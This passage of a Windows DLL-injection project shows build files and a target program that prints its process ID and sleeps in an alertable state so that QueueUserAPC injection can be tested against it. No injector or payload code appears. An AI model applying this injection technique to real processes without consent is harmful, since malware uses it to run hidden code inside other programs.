      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="src\Target.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`TargetProgram/TargetProgram.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ShowAllFiles>true</ShowAllFiles>
  </PropertyGroup>
</Project>
```

`TargetProgram/src/Target.cpp`:

```cpp
#include <iostream>
#include <Windows.h>


int main() {

	/*LPCSTR DllPath = "C:\\Users\\k.rajabzadeh\\source\\repos\\SimpleDllInjector\\DLLFileBuild\\bin\Win32\\Debug\\DLLFile.dll";
	HINSTANCE h = LoadLibrary(DllPath);

	

	if (h) {
		printf("success, 0x%x\n", GetLastError());
		LogMessage("Helllllllloooooooooooo from DLL");
	}
	else {
		printf("failure, 0x%x\n", GetLastError());
	}*/

	while (true) {
		printf("My PID is %d\n", GetCurrentProcessId());
		SleepEx(1000, true);// Call Sleep function with alertable flag to put the thread in suspended state for using in QueueUserAPC method
	}

}
```

`WindowsDLLInjector.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 15
VisualStudioVersion = 15.0.28307.852
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Injector", "Injector\Injector.vcxproj", "{88F889C8-1CE7-4E52-AB34-1270B6B92514}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "TargetProgram", "TargetProgram\TargetProgram.vcxproj", "{15863529-2853-4ABE-815E-F4A8F13B8FC4}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "PayloadDLL", "PayloadDLL\PayloadDLL.vcxproj", "{A37A7D73-ECD3-4F67-8343-907881F34DA3}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Debug|x64.ActiveCfg = Debug|x64
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Debug|x64.Build.0 = Debug|x64
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Debug|x86.ActiveCfg = Debug|Win32
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Debug|x86.Build.0 = Debug|Win32
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Release|x64.ActiveCfg = Release|x64
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Release|x64.Build.0 = Release|x64
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Release|x86.ActiveCfg = Release|Win32
		{88F889C8-1CE7-4E52-AB34-1270B6B92514}.Release|x86.Build.0 = Release|Win32
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Debug|x64.ActiveCfg = Debug|x64
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Debug|x64.Build.0 = Debug|x64
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Debug|x86.ActiveCfg = Debug|Win32
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Debug|x86.Build.0 = Debug|Win32
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Release|x64.ActiveCfg = Release|x64
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Release|x64.Build.0 = Release|x64
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Release|x86.ActiveCfg = Release|Win32
		{15863529-2853-4ABE-815E-F4A8F13B8FC4}.Release|x86.Build.0 = Release|Win32
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Debug|x64.ActiveCfg = Debug|x64
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Debug|x64.Build.0 = Debug|x64
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Debug|x86.ActiveCfg = Debug|Win32
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Debug|x86.Build.0 = Debug|Win32
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Release|x64.ActiveCfg = Release|x64
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Release|x64.Build.0 = Release|x64
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Release|x86.ActiveCfg = Release|Win32
		{A37A7D73-ECD3-4F67-8343-907881F34DA3}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {BF1C30EC-2B83-43A1-ABAB-FA2EAD131A69}
	EndGlobalSection
EndGlobal

```